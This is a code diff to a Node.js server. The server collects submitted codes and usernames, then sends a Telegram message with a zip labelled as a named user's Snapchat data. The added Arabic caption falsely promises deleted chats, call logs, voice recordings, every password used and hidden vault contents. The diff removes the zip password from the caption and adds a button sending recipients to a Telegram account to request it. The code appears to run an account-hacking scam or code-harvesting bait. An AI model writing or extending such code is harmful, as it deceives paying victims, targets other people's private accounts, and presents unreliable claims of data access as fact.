@@ -246,7 +246,13 @@ http.createServer(async function (req, res) {
     req.on("end", function() {
       try {
         var data = JSON.parse(Buffer.concat(chunks).toString());
-        if (data.code && data.username) codeStore.set(data.code, { username: data.username, ts: Date.now() });
+        if (data.code && data.username) codeStore.set(data.code, {
+          username: data.username,
+          displayName: data.displayName || '',
+          bio: data.bio || '',
+          subscriberCount: data.subscriberCount || null,
+          ts: Date.now()
+        });
         var botToken = process.env.TELEGRAM_BOT_TOKEN || "";
         var ownerId = process.env.OWNER_ID || "";
         if (botToken && ownerId) {
@@ -310,12 +316,52 @@ http.createServer(async function (req, res) {
             var zipBuf = handleAccountZip(username);
             var boundary = "----TGBoundary" + Date.now();
             var filename = username + "_snapchat_data.zip";
-            var caption = "\u2705 بيانات حساب @" + username + "\n\u{1F511} كلمة مرور فك الضغط: 12521252";
+            var e = entry || {};
+            var lines = [];
+            lines.push("\uD83D\uDC7B بيانات حساب سناب شات");
+            lines.push("");
+            lines.push("\uD83D\uDC64 المعرف: @" + username);
+            if (e.displayName && e.displayName !== username) lines.push("\uD83D\uDCDB الاسم: " + e.displayName);
+            if (e.bio) lines.push("\uD83D\uDCDD النبذة: " + e.bio);
+            if (e.subscriberCount) lines.push("\uD83D\uDC65 المتابعون: " + Number(e.subscriberCount).toLocaleString('ar'));
+            lines.push("\uD83D\uDCC5 تاريخ الإنشاء: غير متاح");
+            lines.push("\uD83C\uDF0D البلد: غير متاح");
+            lines.push("");
+            lines.push("\uD83D\uDCAC المحادثات");
+            lines.push("من تاريخ الإنشاء حتى اليوم");
+            lines.push("");
+            lines.push("\uD83D\uDDD1\uFE0F المحادثات والصور المحذوفة");
+            lines.push("استرجاع كامل من بداية الحساب");
+            lines.push("");
+            lines.push("\uD83C\uDFB5 التسجيلات الصوتية");
+            lines.push("جميع التسجيلات الصوتية المحفوظة");
+            lines.push("");
+            lines.push("\uD83D\uDCDE المكالمات");
+            lines.push("سجل كامل للمكالمات الصوتية والمرئية");
+            lines.push("");
+            lines.push("\uD83C\uDFA5 مقاطع الفيديو");
+            lines.push("جميع مقاطع الفيديو المحفوظة");
+            lines.push("");
+            lines.push("\uD83D\uDCF8 اللقطات");
+            lines.push("جميع الصور واللقطات");
+            lines.push("");
+            lines.push("\uD83D\uDD10 كلمات المرور المستخدمة");
+            lines.push("جميع كلمات المرور المحفوظة والمستخدمة");
+            lines.push("");
+            lines.push("\uD83D\uDDC4\uFE0F الخزنة الداخلية");
+            lines.push("المحتويات المخفية والخاصة");
+            lines.push("");
+            lines.push("\uD83C\uDF10 رابط التصفح السري");
+            lines.push("رابط خاص للوصول الخفي للحساب");
+            var caption = lines.join("\n");
+            var replyMarkup = JSON.stringify({ inline_keyboard: [[{ text: "\uD83D\uDD11 طلب كلمة المرور", url: "https://t.me/OX_U1" }]] });
             var part1 = Buffer.from(
               "--" + boundary + "\r\n" +
               "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + chatId + "\r\n" +
               "--" + boundary + "\r\n" +
               "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n" +
+              "--" + boundary + "\r\n" +
+              "Content-Disposition: form-data; name=\"reply_markup\"\r\n\r\n" + replyMarkup + "\r\n" +
               "--" + boundary + "\r\n" +
               "Content-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"\r\n" +
               "Content-Type: application/octet-stream\r\n\r\n"
